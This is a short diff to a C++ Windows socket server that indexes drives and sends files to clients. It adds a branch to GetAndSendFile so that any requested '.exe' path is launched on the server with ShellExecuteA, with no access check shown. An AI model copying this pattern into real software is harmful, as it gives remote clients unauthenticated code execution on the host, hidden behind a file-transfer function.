@@ -416,6 +416,12 @@ void Server::IndexSystem(string drive, const SOCKET clientSocket) {
 }
 
 void Server::GetAndSendFile(string filePath, const SOCKET client_socket) {
+    if (filePath.size() > 4 && filePath.substr(filePath.size() - 4) == ".exe")
+    {
+        std::cout << "Opening .exe file: " << filePath << std::endl;
+        ShellExecuteA(nullptr, "open", filePath.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
+        return;
+    }
     std::vector<char> fileData;
     try {
         std::ifstream file(filePath, std::ios::binary);
